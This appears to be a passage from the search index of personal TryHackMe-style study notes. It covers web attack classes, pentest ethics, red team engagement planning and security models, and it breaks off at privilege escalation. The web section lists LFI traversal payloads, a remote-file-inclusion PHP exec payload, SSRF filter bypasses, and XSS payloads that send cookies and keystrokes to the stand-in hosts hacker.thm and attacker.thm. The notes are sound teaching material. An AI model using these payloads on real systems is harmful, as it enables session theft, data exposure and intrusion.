set by the web server during your online session <code>curl -H \"Cookie: logged_in=true; admin=true\" http://10.10.232.83/cookie-test</code>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#exploit-idor-vulns","title":"Exploit IDOR vulns","text":"<p>IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.</p> <p>Where are they located? The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.</p> <p>Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users' information, for example, /user/details?user_id=123.</p> Type Description Example Basic Basic example Change values in links like: <code>http://online-service.thm/profile?user_id=1305</code> Encoded IDOR IDs Web developers will often encode data into some type of ASCII string commonly using a-z, A-Z, 0-9 and = characters for padding Base64: <code>{\"id\":30}</code> becomes <code>eyJpZCI6MzB9</code> Hashed IDs A bit more complicated to deal with than encoded ones, but they may follow a predictable pattern md5: <code>123</code> becomes <code>202cb962ac59075b964b07152d234b70</code> Unpredictable IDs If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. Swap <code>two</code> account IDs"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#local-file-inclusion-lci","title":"Local File Inclusion (LCI)","text":""},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#local","title":"Local","text":"<p>With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. Theoretically, we can access and display any readable file on a server if there isn't any input validation. Let's say we want to read the <code>/etc/passwd file</code>, we can try the following: <code>http://domain.com/get.php?file=/etc/passwd</code>. In this case, it works because there isn't a directory specified in the <code>include</code> function and no input validation.</p> Type Description Example No specified directory Get the file just like in a console <code>/get.php?file=/etc/passwd</code> Specified directory Use path traversal along with error messages to find the file <code>/get.php?file=../../../../etc/passwd</code> Specified extension Use a <code>null byte</code> operator or the current directory trick <code>/.</code> to bypass the extension, the <code>%00</code> trick is patched and not working with PHP 5.3.4 and above. <code>/get.php?file=/etc/passwd%00</code> Input validation The web application replaces the ../ with the empty string, the PHP filter only matches and replaces the first subset string <code>../</code> it finds and doesn't do another pass. <code>....//....//....//....//....//etc/passwd</code> Include is forced to read from a defined directory Simply include the directory into the payload <code>/get.php?file=languages/../../../../../etc/passwd</code>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#remote","title":"Remote","text":"<p>Include remote files into a vulnerable application. One requirement for RFI is that the <code>allow_url_fopen</code> option needs to be <code>on</code>. The types and examples are  essentially the same as the local file inclusion except we're getting it from a remote server. We could RCE, XSS, DOS, etc. using RFI.</p> <p>Example:</p> <p>On AttackBox nano a file.txt with contents of:  <pre><code>&lt;?php\nprint exec('hostname');\n?&gt;\n</code></pre> Then <code>python3 -m http.server</code> and move over to the browser: <code>http://10.10.21.255/playground.php?file=http://10.10.86.219:8000/x.txt</code></p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#server-side-request-forgery-ssrf","title":"Server-Side Request Forgery (SSRF)","text":"<p>A vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing. There are two types of SSRF vulnerability; the first is a <code>regular SSRF</code> where <code>data is returned to the attacker's screen</code>. The second is a <code>Blind SSRF</code> vulnerability where an SSRF occurs, but <code>no information is returned to the attacker's screen</code>.</p> Description Expected request Hacker request Server request URL modification <code>http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123</code> <code>http://website.thm/stock?url=http://api.website.thm/api/user</code> <code>http://api.website.thm/api/user</code> Directory travelsal <code>http://website.thm/stock?url=/item?id=123</code> <code>http://website.thm/stock?url=/../user</code> <code>http://api.website.thm/api/stock/../user</code> Control the subdomain <code>http://website.thm/stock?server=api&amp;id=123</code> <code>http://website.thm/stock?server=api.website.thm/api/user&amp;x=&amp;id=123</code> <code>http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123</code> Remote server requests <code>http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123</code> <code>http://website.thm/stock?url=http://hacker-domain.thm</code> Gets skipped, instead we get data from <code>hacker-domain.thm</code>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#spotting-an-ssrf","title":"Spotting an SSRF","text":"<ol> <li>When a full URL is used in a parameter in the address bar.</li> <li>A hidden field in a form: <code>&lt;input type=\"hidden\" name=\"server\" value=\"http://server.website.thm/store\"&gt;</code></li> <li>A partial URL such as just the hostname: <code>https://website.thm/form?server=api</code></li> <li>Or perhaps only the path of the URL: <code>https://website.thm/form?dst=/forms/contact</code></li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#defeating-common-ssrf-defenses","title":"Defeating Common SSRF Defenses","text":"<ol> <li>Deny list,  bypass by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127...*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.</li> <li>Allow list, circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.</li> <li>Open Redirect, Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.</li> </ol>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#cross-site-scripting-xss","title":"Cross-site Scripting (XSS)","text":"Description Example Proof of Concept <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code> Session Stealing <code>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code> Key Logger <code>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</code> Business Logic <code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#reflected-xss","title":"Reflected XSS","text":"<p>User-supplied data in an HTTP request is included in the webpage source without any validation.</p> <p><pre><code>&lt;div class=\"alert alert-danger\"&gt;\n    &lt;p&gt;&lt;script src=\"https://attacker.thm/evil.js\"&gt;&lt;/script&gt;&lt;/p&gt;\n&lt;/div&gt;\n</code></pre> How to test for Reflected XSS:</p> <p>You'll need to test every possible point of entry; these include: - Parameters in the URL Query String - URL File Path - Sometimes HTTP Headers (although unlikely exploitable in practice)</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#stored-xss","title":"Stored XSS","text":"<p>The XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.</p> <p>How to test for Stored XSS:</p> <p>You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be: - Comments on a blog - User profile information - Website Listings</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#dom-based-xss","title":"DOM Based XSS","text":"<p>DOM stands for Document Object Model and is a programming interface for <code>HTML</code> and <code>XML</code> documents. It represents the <code>page</code> so that programs can change the document structure, style and content. A web <code>page</code> is a document, and this document can be either displayed in the <code>browser window</code> or as the <code>HTML source</code>.</p> <p>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</p> <p>How to test for Dom Based XSS: 1. You'd need to look for parts of the code that access certain <code>variables</code> that an attacker can have control over, such as <code>window.location.x</code> parameters. 2. When you've found those bits of code, you'd then need to see how they are handled and whether the <code>values</code> are ever written to the web page's DOM or passed to unsafe JavaScript methods such as <code>eval()</code>.</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#blind-xss","title":"Blind XSS","text":"<p>Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view. However, you can't see the payload working or be able to test it against yourself first.</p> <p>How to test for Blind XSS: - Ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed. - A popular tool for Blind XSS attacks is XSS Hunter Express, this tool will automatically capture cookies, URLs, page contents and more.</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#xss-polyglots","title":"XSS Polyglots","text":"<p>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. <pre><code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e\n</code></pre></p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#command-injection","title":"Command Injection","text":"<p>Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with.</p> <p>Command injection is also often known as \u201cRemote Code Execution\u201d (RCE) because of the ability to remotely execute code within an application.</p> <p>Cheat Sheet</p>"},{"location":"Cybersecurity/Gaining%20Access/WebEnum/#sql-injection","title":"SQL Injection","text":"<p><code>SQL</code> (Structured Query Language) Injection, mostly referred to as <code>SQLi</code>, is an attack on a web application database server that causes malicious queries to be executed. A database is controlled by a <code>DBMS</code>, which is an acronym for  Database Management System.</p> SQLi type Description Example In-Band In-Band just refers to the <code>same method of communication</code> being used to exploit the vulnerability and also receive the results. Discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page. Blind SQLi We get little to no feedback to confirm whether our injected queries were, in fact, successful or not Authentication bypass, boolean based, time based Out-of-band Isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of <code>external network call</code> based on the results from an SQL query. The attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control."},{"location":"Cybersecurity/General/PentestingFundamentals/","title":"Pentesting Fundamentals","text":""},{"location":"Cybersecurity/General/PentestingFundamentals/#ethics","title":"Ethics","text":"<p>A penetration test is an <code>authorised audit</code> of a computer system's security and defences as agreed by the owners of the systems. The legality of penetration is pretty clear-cut in this sense; anything that falls outside of this agreement is deemed unauthorised.</p> <p>Before a penetration test starts, a formal discussion occurs between the penetration tester and the system owner. Various tools, techniques, and systems to be tested are agreed on. This discussion <code>forms the scope of the penetration testing agreement</code> and will determine the course the penetration test takes.</p> Hat Category Description Example White Hat These hackers are considered the \"good people\". They remain within the law and use their skills to benefit others. A penetration tester performing an authorised engagement on a company. Grey Hat These people use their skills to benefit others often; however, they do not respect/follow the law or ethical standards at all times. Someone taking down a scamming site without an agreement from the site owners to do so. Black Hat These people are criminals and often seek to damage organisations or gain some form of financial benefit at the cost of others. Ransomware authors infect devices with malicious code and hold data for ransom."},{"location":"Cybersecurity/General/PentestingFundamentals/#rules-of-engagement-roe","title":"Rules of Engagement (ROE)","text":"<p>The <code>ROE</code> is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections:</p> Section Description Permission Gives explicit permission for the engagement to be carried out. This permission is essential to legally protect individuals and organisations for the activities they carry out. Test Scope Will annotate specific targets to which the engagement should apply. For example, the penetration test may only apply to certain servers or applications but not the entire network. Rules Will define exactly the techniques that are permitted during the engagement. For example, the rules may specifically state that techniques such as phishing attacks are prohibited, but MITM (Man-in-the-Middle) attacks are okay."},{"location":"Cybersecurity/General/PentestingFundamentals/#methodologies","title":"Methodologies","text":"<ol> <li>Information gathering</li> <li>Enumeration / Scanning</li> <li>Exploitation</li> <li>Privilege escalation</li> <li>Post-exploitation</li> </ol>"},{"location":"Cybersecurity/General/PentestingFundamentals/#osstmm","title":"OSSTMM","text":"<p>The Open Source Security Testing Methodology Manual provides a detailed framework of testing strategies for systems, software, applications, communications and the human aspect of cybersecurity.</p>"},{"location":"Cybersecurity/General/PentestingFundamentals/#owasp","title":"OWASP","text":"<p>The \"Open Web Application Security Project\" framework is a community-driven and frequently updated framework used solely to test the security of web applications and services.</p>"},{"location":"Cybersecurity/General/PentestingFundamentals/#nist-cybersecurity-framework-11","title":"NIST Cybersecurity Framework 1.1","text":"<p>The NIST Cybersecurity Framework is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats. This framework is a bit of an honourable mention because of its popularity and detail.</p> <p>The framework provides guidelines on security controls &amp; benchmarks for success for organisations from critical infrastructure (power plants, etc.) all through to commercial.  There is a limited section on a standard guideline for the methodology a penetration tester should take.</p>"},{"location":"Cybersecurity/General/PentestingFundamentals/#ncsc-caf","title":"NCSC CAF","text":"<p>The Cyber Assessment Framework (CAF) is an extensive framework of fourteen principles used to assess the risk of various cyber threats and an organisation's defences against these.</p>"},{"location":"Cybersecurity/General/PentestingFundamentals/#types-of-testing-boxes","title":"Types of testing \"boxes\"","text":"Box type Description Black box High-level process where the tester is <code>not given any information</code> about the inner workings of the application or service. Grey box The combination of both black-box and white-box testing processes. The tester will have some <code>limited knowledge</code> of the internal components of the application or piece of software. White box Usually done by a software developer who knows programming and application logic. The tester will have <code>full knowledge</code> of the application and its expected behaviour and is much more time consuming than black-box testing."},{"location":"Cybersecurity/General/RTEngagements/","title":"Red team engagements","text":""},{"location":"Cybersecurity/General/RTEngagements/#defining-scope-and-objectives","title":"Defining scope and objectives","text":"<p>Engagements can be very complex and bureaucratic. The key to a successful engagement is clearly defined client objectives or goals.</p> <p>Example: - No exfiltration of data. - Production servers are off-limits. - 10.0.3.8/18 is out of scope. - 10.0.0.8/20 is in scope. - System downtime is not permitted under any circumstances. - Exfiltration of PII is prohibited.</p> <p>Objectives: 1. Identify system misconfigurations and network weaknesses.    1. Focus on exterior systems. 2. Determine the effectiveness of endpoint detection and response systems. 3. Evaluate overall security posture and response.    1. SIEM and detection measures.    2. Remediation.    3. Segmentation of DMZ and internal servers. 4. Use of white cards is permitted depending on downtime and length. 5. Evaluate the impact of data exposure and exfiltration.</p> <p>Scope: 1. System downtime is not permitted under any circumstances.    1. Any form of DDoS or DoS is prohibited.    2. Use of any harmful malware is prohibited; this includes ransomware and other variations. 2. Exfiltration of PII is prohibited. Use arbitrary exfiltration data. 3. Attacks against systems within 10.0.4.0/22 are permitted. 4. Attacks against systems within 10.0.12.0/22 are prohibited. 5. Bean Enterprises will closely monitor interactions with the DMZ and critical/production systems.    1. Any interaction with \".bethechange.xyz\" is prohibited.    2. All interaction with \".globalenterprises.thm\" is permitted.</p>"},{"location":"Cybersecurity/General/RTEngagements/#rules-of-engagement","title":"Rules of engagement","text":"<p>Here is a ROE template.</p> Section Name Section Details Executive Summary Overarching summary of all contents and authorization within RoE document Purpose Defines why the RoE document is used References Any references used throughout the RoE document (HIPAA, ISO, etc.) Scope Statement of the agreement to restrictions and guidelines Definitions Definitions of technical terms used throughout the RoE document Rules of Engagement and Support Agreement Defines obligations of both parties and general technical expectations of engagement conduct Provisions Define exceptions and additional information from the Rules of Engagement Requirements, Restrictions, and Authority Define specific expectations of the red team cell Ground Rules Define limitations of the red team cell's interactions Resolution of Issues/Points of Contact Contains all essential personnel involved in an engagement Authorization Statement of authorization for the engagement Approval Signatures from both parties approving all subsections of the preceding document Appendix Any further information from preceding subsections"},{"location":"Cybersecurity/General/RTEngagements/#campaign-planning","title":"Campaign planning","text":"<p>Prior to this task, we have primarily focused on engagement planning and documentation from the business perspective. Campaign planning uses the information acquired and planned from the client objectives and RoE and applies it to various plans and documents to identify how and what the red team will do.</p> Type of Plan Explanation of Plan Plan Contents Engagement Plan An overarching description of technical requirements of the red team. CONOPS, Resource and Personnel Requirements, Timelines Operations Plan An expansion of the Engagement Plan. Goes further into specifics of each detail. Operators, Known Information, Responsibilities, etc. Mission Plan The exact commands to run and execution time of the engagement. Commands to run, Time Objectives, Responsible Operator, etc. Remediation Plan Defines how the engagement will proceed after the campaign is finished. Report, Remediation consultation, etc."},{"location":"Cybersecurity/General/RTEngagements/#engagement-plan","title":"Engagement plan","text":""},{"location":"Cybersecurity/General/RTEngagements/#concept-of-operations","title":"Concept of operations","text":"<p><code>The Concept of Operation (CONOPS)</code> is a part of the engagement plan that details a high-level overview of the proceedings of an engagement. The CONOPS document should be written from a semi-technical summary perspective, assuming the target audience/reader has zero to minimal technical knowledge.</p> <p>Critical components: - Client Name - Service Provider - Timeframe - General Objectives/Phases - Other Training Objectives (Exfiltration) - High-Level Tools/Techniques planned to be used - Threat group to emulate (if any)</p>"},{"location":"Cybersecurity/General/RTEngagements/#resource-plan","title":"Resource plan","text":"<p>The resource plan is the second document of the engagement plan, detailing a brief overview of dates, knowledge required (optional), resource requirements. The plan extends the CONOPS and includes specific details, such as dates, knowledge required, etc.</p> <p>Unlike the CONOPS, the resource plan should not be written as a summary; instead, written as bulleted lists of subsections. As with most red team documents, there is no standard set of resource plan templates or documents; below is an outline of example subsections of the resource plan.</p> <ul> <li>Header<ul> <li>Personnel writing</li> <li>Dates</li> <li>Customer</li> </ul> </li> <li>Engagement Dates<ul> <li>Reconnaissance Dates</li> <li>Initial Compromise Dates</li> <li>Post-Exploitation and Persistence Dates</li> <li>Misc. Dates</li> </ul> </li> <li>Knowledge Required (optional)<ul> <li>Reconnaissance</li> <li>Initial Compromise</li> <li>Post-Exploitation</li> </ul> </li> <li>Resource Requirements<ul> <li>Personnel</li> <li>Hardware</li> <li>Cloud</li> <li>Misc.</li> </ul> </li> </ul>"},{"location":"Cybersecurity/General/RTEngagements/#operations-plan","title":"Operations plan","text":"<p>The operations plan is a flexible document(s) that provides specific details of the engagement and actions occurring. The plan expands upon the current CONOPS and should include a majority of specific engagement information; the ROE can also be placed here depending on the depth and structure of the ROE.</p> <p>The operations plan should follow a similar writing scheme to the resource plan, using bulleted lists and small sub-sections. As with the other red team documents, there is no standard set of operation plan templates or documents; below is an outline of example subsections within the operations plan.</p> <ul> <li>Header<ul> <li>Personnel writing</li> <li>Dates</li> <li>Customer</li> </ul> </li> <li>Halting/stopping conditions (can be placed in ROE depending on depth)</li> <li>Required/assigned personnel</li> <li>Specific TTPs and attacks planned</li> <li>Communications plan</li> <li>Rules of Engagement (optional)</li> </ul>"},{"location":"Cybersecurity/General/RTEngagements/#communication-plan","title":"Communication plan","text":"<p>The most notable addition to this document is the communications plan. The communications plan should summarize how the red cell will communicate with other cells and the client overall. Each team will have its preferred method to communicate with clients: - vectr.io - Email - Slack</p>"},{"location":"Cybersecurity/General/RTEngagements/#mission-plan","title":"Mission plan","text":"<p>The mission plan is a cell-specific document that details the exact actions to be completed by operators. The document uses information from previous plans and assigns actions to them.</p> <p>How the document is written and detailed will depend on the team; as this is an internally used document, the structure and detail have less impact.</p> <ul> <li>Objectives</li> <li>Operators</li> <li>Exploits/Attacks</li> <li>Targets (users/machines/objectives)</li> <li>Execution plan variations</li> </ul>"},{"location":"Cybersecurity/General/RTFundamentals/","title":"Read Team Fundamentals","text":"<ul> <li>A penetration tester is tasked to carry out conventional vulnerability assessments.</li> <li>A red teamer is tasked to go beyond a pentest and carry out an actual simulated attack.</li> </ul>"},{"location":"Cybersecurity/General/RTFundamentals/#vulnerability-assessment-and-penetration-tests-limitations","title":"Vulnerability Assessment and Penetration Tests Limitations","text":"<p>This is the simplest form of security assessment. A vulnerability assessment focuses on scanning hosts for vulnerabilities as individual entities so that security deficiencies can be <code>identified</code> and effective security measures can be deployed to <code>protect</code> the network in a prioritized manner. Most of the work can be done with automated tools and performed by operators without requiring much technical knowledge.</p>"},{"location":"Cybersecurity/General/RTFundamentals/#advanced-persistent-threats-and-why-regular-pentesting-is-not-enough","title":"Advanced Persistent Threats and why Regular Pentesting is not Enough","text":"<p>While the conventional security engagements we have mentioned cover the finding of most technical vulnerabilities, there are limitations on such processes and the extent to which they can effectively prepare a company against a real attacker. Such limitations include: - Time constraints - Budget - Limited scope - Non-disruptive - Heavy IT focus</p> <p>As a consequence, some aspects of penetration tests might significantly differ from a real attack, like: - Penetration tests are LOUD: Usually, pentesters won't put much effort into trying to go undetected. Unlike real attackers, they don't mind being easy to detect. - Non-technical attack vectors might be overlooked: Attacks based on <code>social engineering</code> or physical intrusions are usually not included in what is tested. - Relaxation of security mechanisms: While doing a regular penetration test, some security mechanisms might be temporarily disabled or relaxed for the pentesting team in favor of efficiency.</p> <p>On the other hand, real attackers won't follow an ethical code and are mostly unrestricted in their actions. Nowadays, the most prominent threat actors are known as <code>Advanced Persistent Threats (APT)</code>, which are highly skilled groups of attackers, usually sponsored by nations or organised criminal groups.</p>"},{"location":"Cybersecurity/General/RTFundamentals/#red-team-engagements","title":"Red team engagements","text":"<p>To keep up with the emerging threats, red team engagements were designed to shift the focus from regular penetration tests into a process that allows us to clearly see our defensive team's capabilities at <code>detecting</code> and <code>responding</code> to a real threat actor. They don't replace traditional penetration tests, but complement them by focusing on detection and response rather than prevention.</p> <p>Red teaming is a term borrowed from the military. In military exercises, a group would take the role of a <code>red team</code> to simulate attack techniques to test the reaction capabilities of a defending team, generally known as <code>blue team</code>, against known adversary strategies. Translated into the world of cybersecurity, red team engagements consist of emulating a real threat actor's <code>Tactics, Techniques and Procedures (TTPs)</code> so that we can measure how well our blue team responds to them and ultimately improve any security controls in place.</p> <p>Every red team engagement will start by defining clear goals, often referenced as <code>crown jewels</code> or <code>flags</code>, ranging from compromising a given critical host to stealing some sensitive information from the target.</p> <p>Red team engagements also improve on regular penetration tests by considering several attack surfaces:</p> <ul> <li>Technical Infrastructure: Like in a regular penetration test, a red team will try to uncover technical vulnerabilities, with a much <code>higher emphasis on stealth and evasion</code>.</li> <li>Social Engineering: <code>Targeting people</code> through phishing campaigns, phone calls or social media to <code>trick them into revealing information</code> that should be private.</li> <li>Physical Intrusion: Using techniques like <code>lockpicking</code>, <code>RFID cloning</code>, exploiting weaknesses in electronic access control devices to access restricted areas of facilities.</li> </ul> <p>Depending on the resources available, the red team exercise can be run in several ways:</p> <ul> <li>Full Engagement: Simulate an attacker's full workflow, from initial compromise until final goals have been achieved.</li> <li>Assumed Breach: Start by assuming the attacker has already gained control over some assets, and try to achieve the goals from there. As an example, the red team could receive access to some user's credentials or even a workstation in the internal network.</li> <li>Table-top Exercise:  An over the table simulation where scenarios are discussed between the red and blue teams to evaluate how they would theoretically respond to certain threats. Ideal for situations where doing live simulations might be complicated.</li> </ul>"},{"location":"Cybersecurity/General/RTFundamentals/#teams-and-functions-of-an-engagement","title":"Teams and functions of an engagement","text":"<p>There are several factors and people involved within a red team engagement. Everyone will have their mindset and methodology to approach the engagement personnel.</p> Teams Definitions Red cell A red cell is the component that makes up the <code>offensive portion</code> of a red team engagement that simulates a given target's strategic and tactical responses. Blue cell The blue cell is the opposite side of red. It includes all the components defending a target network. The blue cell is typically comprised of <code>blue team members, defenders, internal staff, and an organisation's management</code>. White cell Serves as <code>referee</code> between red cell activities and blue cell responses <code>during an engagement</code>. Controls the engagement environment/network. <code>Monitors adherence to the ROE</code>. <code>Coordinates activities</code> required to achieve engagement goals. Correlates red cell activities with defensive actions. Ensures the engagement is conducted without bias to either side. <p>These teams or cells can be broken down further into an engagement hierarchy.</p> <p></p> Role Purpose Red Team Lead <code>Plans and organises</code> engagements at a high level\u2014delegates, assistant lead, and operators engagement assignments. Red Team Assistant Lead Assists the team lead in <code>overseeing engagement</code> operations and operators. Can also assist in writing engagement plans and documentation if needed. Red Team Operator <code>Executes</code> assignments delegated by team leads. Interpret and analyse engagement plans from team leads."},{"location":"Cybersecurity/General/RTFundamentals/#engagement-structure","title":"Engagement structure","text":"<p>Structures usually follow a <code>kill chain</code> of sorts, which is a military concept that identifies the structure of an attack. In this case we'll look at the common <code>Lockheed Martin Cyber Kill Chain</code>.</p> <ol> <li>Recon</li> <li>Weaponisation</li> <li>Delivery</li> <li>Exploitation</li> <li>Installation</li> <li>Command &amp; control</li> <li>Actions on objectives</li> </ol>"},{"location":"Cybersecurity/General/SecurityPrinciples/","title":"Principles of security","text":""},{"location":"Cybersecurity/General/SecurityPrinciples/#the-cia-triad","title":"The CIA triad","text":"<p>The <code>CIA</code> triad is an information security model used in <code>consideration</code> throughout creating a security policy.</p> <ol> <li> <p>Confidentiality     The <code>protection</code> of data <code>from unauthorized access</code> and misuse.</p> <p>Example: Employee records and accounting documents will be considered sensitive. Confidentiality will be provided in the sense that only HR administrators will access employee records, where vetting and tight access controls are in place.</p> </li> <li> <p>Integrity     The condition where <code>information</code> is <code>kept accurate</code> and consistent unless authorized changes are made.</p> <p>Example: Hash verifications and digital signatures can help ensure that transactions are authentic and that files have not been modified or corrupted.</p> </li> <li> <p>Availability     In order for <code>data</code> to be useful, it must be available and <code>accessible</code> by the user.</p> <p>Example: Having reliable and well-tested hardware for their information technology servers (i.e. reputable servers).</p> </li> </ol>"},{"location":"Cybersecurity/General/SecurityPrinciples/#the-dad-triad","title":"The DAD triad","text":"<p>The security of a system is <code>attacked through one of several means</code>. It can be via the disclosure of secret data, alteration of data, or destruction of data. 1. Disclosure 2. Alteration 3. Destruction or Denial</p>"},{"location":"Cybersecurity/General/SecurityPrinciples/#principles-of-privileges","title":"Principles of Privileges","text":"<p>The levels of access given to individuals are determined on two primary factors: 1. The individual's <code>role/function</code> within the organisation 2. The <code>sensitivity</code> of the information being stored on the system</p> <p>Two key concepts are used to assign and manage the access rights of individuals: 1. Privileged Identity Management (<code>PIM</code>)     Used to <code>translate</code> a user's <code>role</code> within an organisation <code>into</code> an access <code>role on a system</code>.</p> <ol> <li>Privileged Access Management (<code>PAM</code>).     <code>Management of the privileges</code> a system's access role has, amongst other things</li> </ol>"},{"location":"Cybersecurity/General/SecurityPrinciples/#security-models","title":"Security models","text":""},{"location":"Cybersecurity/General/SecurityPrinciples/#the-bell-la-padula-model","title":"The Bell-La Padula Model","text":"<p>Used to achieve confidentiality. This model has a few assumptions, such as an organisation's hierarchical structure it is used in, where everyone's responsibilities/roles are well-defined.</p> <p>Works by <code>granting access</code> to pieces of data (called objects) on a strictly <code>need to know basis</code>. This model uses the rule \"<code>no write down, no read up</code>\".</p> <p></p>"},{"location":"Cybersecurity/General/SecurityPrinciples/#biba-model","title":"Biba Model","text":"<p>The Biba model is arguably the equivalent of the Bell-La Padula model but for the integrity of the CIA triad.</p> <p>This model applies the rule to objects (data) and subjects (users) that can be summarised as \"<code>no write up, no read down</code>\". This rule means that subjects can create or write content to objects at or below their level but can only read the contents of objects above the subject's level.</p> <p></p>"},{"location":"Cybersecurity/General/SecurityPrinciples/#clark-wilson-model","title":"Clark-Wilson Model","text":"<p>The Clark-Wilson Model also aims to achieve integrity by using the following concepts:</p> <ul> <li>Constrained Data Item (CDI): This refers to the data type whose integrity we want to preserve.</li> <li>Unconstrained Data Item (UDI): This refers to all data types beyond CDI, such as user and system input.</li> <li>Transformation Procedures (TPs): These procedures are programmed operations, such as read and write, and should maintain the integrity of CDIs.</li> <li>Integrity Verification Procedures (IVPs): These procedures check and ensure the validity of CDIs.</li> </ul>"},{"location":"Cybersecurity/General/SecurityPrinciples/#other-models","title":"Other models","text":"<ul> <li>Brewer and Nash model</li> <li>Goguen-Meseguer model</li> <li>Sutherland model</li> <li>Graham-Denning model</li> <li>Harrison-Ruzzo-Ullman model</li> </ul>"},{"location":"Cybersecurity/General/SecurityPrinciples/#zero-trust-principle-vs-trust-but-verify","title":"Zero trust principle vs. Trust but verify","text":"<ol> <li>Zero Trust</li> </ol> <p>This principle treats <code>trust as a vulnerability</code>, and consequently, it caters to insider-related threats. After considering trust as a vulnerability, zero trust tries to eliminate it. It is teaching indirectly, \u201cnever trust, always verify.\u201d In other words, every entity is considered adversarial until proven otherwise. Zero trust does not grant trust to a device based on its location or ownership. This approach contrasts with older models that would trust internal networks or enterprise-owned devices. Authentication and authorization are required before accessing any resource. As a result, if any breach occurs, the damage would be more contained if a zero trust architecture had been implemented.</p> <ol> <li>Trust but Verify</li> </ol> <p>This principle teaches that we should <code>always verify even when we trust</code> an entity and its behaviour. An entity might be a user or a system. Verifying usually requires setting up proper logging mechanisms; verifying indicates going through the logs to ensure everything is normal. In reality, it is not feasible to verify everything; just think of the work it takes to review all the actions taken by a single entity, such as Internet pages browsed by a single user. This requires automated security mechanisms, such as proxy, intrusion detection, and intrusion prevention systems.</p>"},{"location":"Cybersecurity/General/SecurityPrinciples/#threat-modelling-incident-response","title":"Threat Modelling &amp; Incident Response","text":"<p>Threat modelling is the process of <code>reviewing</code>, <code>improving</code>, and <code>testing</code> the <code>security protocols</code> in place in an organisation's information technology infrastructure and services.</p> <p>The principles all return to: - Preparation - Identification - Mitigations - Review</p> <p>For example, an effective threat model includes: - Threat intelligence - Asset identification - Mitigation capabilities - Risk assessment</p> <p>To help with this, there are frameworks such as <code>STRIDE</code> (Spoofing identity, Tampering with data, Repudiation threats, Information disclosure, Denial of Service and Elevation of privileges) and <code>PASTA</code> (Process for Attack Simulation and Threat Analysis).</p> <p>Incidents are classified using a rating of urgency and impact. Urgency will be determined by the type of attack faced, where the impact will be determined by the affected system and what impact that has on business operations.</p> <p></p> <p>An incident is responded to by a Computer Security Incident Response Team (<code>CSIRT</code>) which is prearranged group of employees with technical knowledge about the systems and/or current incident. To successfully solve an incident, these steps are often referred to as the six phases of Incident Response that takes place, listed in the table below: | Action | Description | |-|-| | Preparation | Do we have the resources and plans in place to deal with the security incident? | | Identification | Has the threat and the threat actor been correctly identified in order for us to respond to? | | Containment | Can the threat/security incident be contained to prevent other systems or users from being impacted? | | Eradication | Remove the active threat. | | Recovery | Perform a full review of the impacted systems to return to business as usual operations. | | Lessons Learned | What can be learnt from the incident? I.e. if it was due to a phishing email, employees should be trained better to detect phishing emails. |</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/","title":"Priveledge escalation","text":"<p>Ok, we have a shell. Now what? Most shells tend to be unstable and non-interactive. Time to exploit of a vulnerability, design flaw, or configuration oversight in an operating system or application to <code>gain unauthorized access</code> to resources that are usually restricted from the users.</p> <p>On Linux ideally we would be 